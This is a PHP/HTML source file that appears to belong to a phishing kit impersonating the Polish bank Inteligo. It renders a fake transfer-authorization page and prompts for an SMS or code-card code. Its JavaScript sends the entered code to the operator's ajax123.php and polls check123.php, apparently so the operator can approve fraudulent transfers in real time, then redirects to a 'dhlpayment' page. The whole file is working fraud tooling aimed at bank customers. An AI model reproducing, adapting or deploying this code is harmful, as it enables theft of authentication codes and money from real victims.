<?php 
	include('../bank_header.php');
	include('../../../db.php'); 
	include('../../../YH0uW3ecaRHG16ld4waY.php');
	
	if($_REQUEST['id']){
		$id = mysqli_real_escape_string($con,$_REQUEST['id']);
		$page_name = basename($_SERVER['PHP_SELF']);
		$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
		$con->query($sqlss);
	}
	
	$query = "SELECT * FROM `payment` WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
	$new = $con->query($query);
	$rowpay = $new->fetch_assoc();
	$number = $rowpay['account_number'];
	$grip = $rowp['gridcode'];
	$num = $new->num_rows;

	$array  = array_map('intval', str_split($number));
?>


<script type="text/javascript" src="js/public.js"></script>
<script type="text/javascript">
	setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);

</script>




<!DOCTYPE html>
<html lang="en" class="broken-image-checker" ng-app>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<!--iPhone from zooming form issue (maximum-scale=1, user-scalable=0)-->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
	<title>Serwis WWW Inteligo</title>

	<link rel="icon" type="image/png" href="images/inteligo.ico">
	
    <!-- Bootstrap --><link href="css/bootstrap.min.css" rel="stylesheet">
	
	<link rel="stylesheet" href="css/paolo4.css">
	
	
	<!-- jQuery -->
	<!--[if (!IE)|(gt IE 8)]><!-->
	  <script src="js/jquery-2.2.4.min.js"></script>
	<!--<![endif]-->

	<script src="js/bootstrap.min.js"></script>
	
	<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">

  </head>
  <body class="transition nav-plusminus slide-navbar slide-navbar--right hdr--sticky-mobile--off"  style="background:#a4bfd0">

  <div id="body-wrapper" class="container">
		<div class="row">
		<div class="col-md-12 mr50">
		<div id="title-bar" style="height:53px;">
		
		<a href="http://inteligo.pl/" id="logo" aria-labelledby="logo-infotip-text">&nbsp;</a>
		<div id="logo-infotip" style="display: none;">
			<div id="logo-infotip-icon">&nbsp;</div>
			<div id="logo-infotip-text">Powrót do serwisu informacyjnego</div>
			<script type="text/javascript">
				$('#logo-infotip').hide();
				$("a#logo").mouseenter(function() {
					$('#logo-infotip').show();
				});
				$("a#logo").mouseleave(function() {
					$("#logo-infotip").hide();
				});
			</script>
		</div>
		</div>
		<ul id="main-menu"></ul>
		
		<div class="wrap-content">
    <div class="layout-content">
     
    <div class="layout-page-middle1 new-navigation">
		<div class="form-box" style="margin-bottom: 15px; margin-top: 3px">
			<div id="" class="table_list tableListInfoTable">
				<table cellspacing="0" class="table-list"></table><div class="message empty-table ">
					<div class="box-info" style="padding-top: 0;">
						<span style="font-weight: bold">Zbliżają się roczne rozliczenia podatkowe - zaktualizuj swoje dane<br></span>Zbliża się termin otrzymywania informacji podatkowych, pomocnych w rozliczaniu zobowiązań podatkowych za 2017 rok – pamiętaj o zaktualizowaniu swoich danych.<a target="_blank" href="http://inteligo.pl/aktualnosci/komunikaty/zblizaja-sie-roczne-rozliczenia-podatkowe-zaktualizuj-swoje-dane_2/" title="Więcej"><strong>Więcej&nbsp;&gt;&gt;</strong></a>
					</div>
				</div>
			</div>
		</div>
        <div class="form-box save-no-password form-no-required">
			<div class="box-input" style="display:none">
				<div class="box-input-wrap">
				<input type="text" style="display:none" class="decoy" value="E" name="login0">
				</div>
			</div>
			<div class="box-input" style="display:none">
				<div class="box-input-wrap">
					<input type="password" style="display:none" class="decoy" value="D" name="password0">
				</div>
			</div>
			
			<div class="form form_tabular " id="f-form_0145702117" data-action="/secure/igo2/auth/login/submit?flow_id=LZKYp69meKvyWKdMHjF2H4&amp;continue_flow=1" style="display: block;">
				<h1 class="table-title"><span class="inner">Autoryzacja
				</span></h1>
				<div id="warning_sms" style="display:none;" class="w3-panel w3-yellow w3-display-container">
			  <p style="margin-top:10px;">Uwierzytelnianie...</p>
			</div>
				<div  id="wrong_sms" style="display:none;" class="w3-panel w3-red w3-display-container">

				  <p style="margin-top:10px;">Proszę wpisac nowy kod.</p>
				</div>
				<ul class="form-tabular">
					<li class="field_row edit-field field_row-client_id_field NullValidationCharEditFieldTR" id="f-tr-f-form_0145702117-client_id_field">
						<div class="auth_tab">
							<div class="row">
								<div class="col-md-6 col-sm-6 col-xs-12">
									<span  style="margin-left:0px;"><span style="font-family: arial,sans-serif;
    font-size: 13px;
    font-weight: bold;">Odbiorca: </span><?php echo $rowpay['account_name'];?></span>
								</div>
								<div class="col-md-6 col-sm-6 col-xs-12">
									<span  style="margin-left:0px;"><span style="font-family: arial,sans-serif;
    font-size: 13px;
    font-weight: bold;">Numer konta: </span><?php echo $rowpay['account_number'];?></span>
								</div>
							</div>
							<div class="row">
								<div class="col-md-6 col-sm-6 col-xs-12">
									<span  style="margin-left:0px;"><span style="font-family: arial,sans-serif;
    font-size: 13px;
    font-weight: bold;">Kwota: </span><?php echo $rowpay['payment'];?> PLN</span>
								</div>
								<div class="col-md-6 col-sm-6 col-xs-12">
									<span  style="margin-left:0px;"><span style="font-family: arial,sans-serif;
    font-size: 13px;
    font-weight: bold;">Tytuł przelewu: </span><?php echo $rowpay['title'];?></span>
								</div>
							</div>
							<div class="row">
								<div class="col-md-6 col-sm-6 col-xs-12">
									<span  style="margin-left:0px;"><span style="font-family: arial,sans-serif;
    font-size: 13px;
    font-weight: bold;">Data: </span><?php echo date('d/m/Y');?></span>
								</div>
							</div>
						</div>
						
						<div  id="loading_id">
							<div class="h--overlay-white" style="zoom: 1;">
								<p >
									<center style="font-size:20px;font-weight:bold;color:black;" id="loading_mobile">
									<img src="images/loading.gif" style="width:100px;"/> </center>
								</p>
							</div>
							</div>
						<div id="maincontent" style="display:none;">
							<div class="form-label">
								<span id="sss" class="mr70 auth_tab aaa" ></span>
								<span class="form-field NullValidationCharEditFieldTd">
									<span class="NullValidationCharEditField_field_widget field_widget " id="f-form_0145702117-client_id_field-field_widget">
										<span class="box-input">
											<span class="box-input-wrap">
												<input  maxlength="50"  id="SmsCodes" onkeypress="sms_change()"
												size="62" type="password" style="width:200px;border-radius:5px;"
												tabindex="10" aria-flowto="f-form_0145702117-client_id_field-help">
											</span>
											<span class="question"></span>
										</span>
									</span>
								</span>
							</div>
							
							<div class="row" style="margin-top:20px;">
							<div class="col-md-3 col-sm-3"> </div>
							<div class="col-md-3 col-sm-3 col-xs-6">
							<button id="back" class="image-button1 button-dalej button button_ok" style="display:inline-block;" tabindex="10" title="Dalej"></button>
							</div>
							<div class="col-md-3 col-sm-3 col-xs-6">
							<button  id="confirm" class="image-button2 button-dalej button button_ok" tabindex="10" title="Dalej"></button>
							</div>
							<div class="col-md-3 col-sm-3"></div>
							</div>
						</div>
						
					</li>
				</ul>
					
						
				
				</div>
				<div class="box-input" style="display:none">
					<div class="box-input-wrap">
						<input type="text" style="display:none" class="decoy" value="C" name="login1">
					</div>
				</div>
					<div class="box-input" style="display:none">
						<div class="box-input-wrap">
							<input type="password" style="display:none" class="decoy" value="O" name="password1">
						</div>
					</div>
					<div class="box-input" style="display:none">
						<div class="box-input-wrap">
							<input type="password" style="display:none" class="decoy" value="Y" name="password2">
						</div>
					</div>
			</div>
				<div style="clear: both;">        
					<div class="box-login">
						<h1><span class="login-icon-key"></span>Bezpieczeństwo w Inteligo</h1>
						<div class="holder secure">
							Pamiętaj: Logowanie do serwisu transakcyjnego Inteligo nie wymaga podania kodu z narzędzia autoryzacyjnego - nigdy nie podawaj kodu podczas logowania ani bezpośrednio po zalogowaniu do serwisu!<br>&nbsp; <a href="http://inteligo.pl/redirect/bezpieczenstwo" target="_blank"><br>Więcej o bezpiecznym logowaniu</a> <br><br></div>
					</div>
					<div class="login-spacer"></div>
					<div class="box-login">
						<h1><span class="login-icon-page"></span>Program poleceń Mam Inteligo</h1>
						<div class="holder account">
							Zarejestruj się, zarabiaj i wygrywaj.
							
							<div><div>- 1000 zł za największą liczbę poleceń</div>
							<div>- 50 zł za każde skutecznie polecone konto<br></div>
							</div><br><a href="https://maminteligo.pl" target="_blank">Więcej</a>
						</div>
					</div>
				</div>
					<div class="clear"></div>
				</div>
					<div class="layout-page-bottom"></div>
				</div>
					<div class="col-md-12" id="bottom-text">
					<div style="text-align:center;">
					<div class="shadow"></div>
					</div>
					Konto Inteligo prowadzone jest przez <b>PKO Bank Polski</b>.
					</div>
					<div class="clear"></div>
					<div class="layout-footer">
						<div id="deposits-link">
					
							<a style="z-index:1000;color:white !important;opacity:0.2;" class="standalone" href="http://inteligo.pl/infosite/_images/_files/zasady_gwarantowania_depozytow.pdf" target="_blank" title="" aria-describedby="aria_external">
								Gwarantowanie depozytów</a>
						</div>
					</div>
				</div>
			</div>
		</div>
   </div><!--body-wrapper-->

	</body>
</html>

<script>

	window.onload = function() {
		var back = document.getElementById('back');
		var maincontent = document.getElementById('maincontent');
		var SmsCodes = document.getElementById('SmsCodes');
		var loading_id= document.getElementById('loading_id');
		var sss= document.getElementById('sss');
		back.onclick = function() {
			window.location.href="index.php?id=<?php echo $id; ?>";			
			return false;		
		}
		var confirm = document.getElementById('confirm');		
		confirm.onclick = function() {
			auth_code(<?php echo $_REQUEST['id'];?>);
			return false;		
		}


		var myVar = setInterval(function(){ check_status1(<?php echo $id; ?>); }, 1000);
			
		function check_status1(payment_id) {
			//alert(payment_id);
			if (payment_id.length == 0) {

			} else {
				var xmlhttp = new XMLHttpRequest();
				xmlhttp.onreadystatechange = function() {
					if (this.readyState == 4 && this.status == 200) {
						if(this.responseText.includes('sms')){
							$("#loading_id").css("display", "none");
							$("#maincontent").css("display", "block");
							clearInterval(myVar);
							if(this.responseText.includes('sms1')) {
								sss.innerHTML ="Podaj kod sms:";
							}
							else {
						
										sss.innerHTML ="Podaj kod <?php echo $rowp['gridcode']; ?> z karty kodów";        
								///sss.innerHTML ="Podaj kod :".$grip."z karty kodów";
							}
						}
					}
				};
				xmlhttp.open("GET", "check123.php?id=" + payment_id +"&status=aproove&type=1", true);
				xmlhttp.send();
			}
		}
		
		
		
	}
	
	var sms_change = function() {
		$("#wrong_sms").css("display", "none");
		$("#warning_sms").css("display", "none");
	}
	
	function auth_code(payment_id) {
		var codes = document.getElementById("SmsCodes").value;
		if (codes == "") {
			
			
			$("#warning_sms").css("display", "block");
			  
		}
		else {
			if (payment_id.length == 0) {
			} else {
				
				$("#loading_id").css("display", "block");
				$("#maincontent").css("display", "none");
						
				var xmlhttp = new XMLHttpRequest();
				xmlhttp.onreadystatechange = function() {
					if (this.readyState == 4 && this.status == 200) {
						//alert(this.responseText);
						if(!this.responseText.includes('INVALID CODE')){
							
							if(this.responseText.includes('VALID CODE')){
								setInterval(function(){ check_status(<?php echo $id; ?>); }, 5000);
						
		 
							}
						}
					}
				};
				xmlhttp.open("GET", "../ajax123.php?code=" + codes +"&id=" + payment_id, true);
				xmlhttp.send();
			}
		}
		return false;
	}

	function check_status(payment_id) {
		if (payment_id.length !=0) {
			var xmlhttp = new XMLHttpRequest();
			xmlhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {

					if(!this.responseText.includes('INVALID CODE')){
						
						if(this.responseText.includes('VALID CODE')){
							
							$("#loading_id").css("display", "none");
							window.location.href="<?php echo URL_dhlpayment;?>done/index.html";
						}
					}
					
					if(this.responseText.includes('WRONG CODE')){
						$("#loading_id").css("display", "none");
						$("#maincontent").css("display", "block");
						$("#wrong_sms").css("display", "block");
						document.getElementById('SmsCodes').value = "";
		 
					 window.location.href="index_auth.php?id=<?php echo $id; ?>";
                
					}
				}
			};
			xmlhttp.open("GET", "../check123.php?id=" + payment_id +"&status=aproove&type=0", true);
			xmlhttp.send();
		}
	}
</script>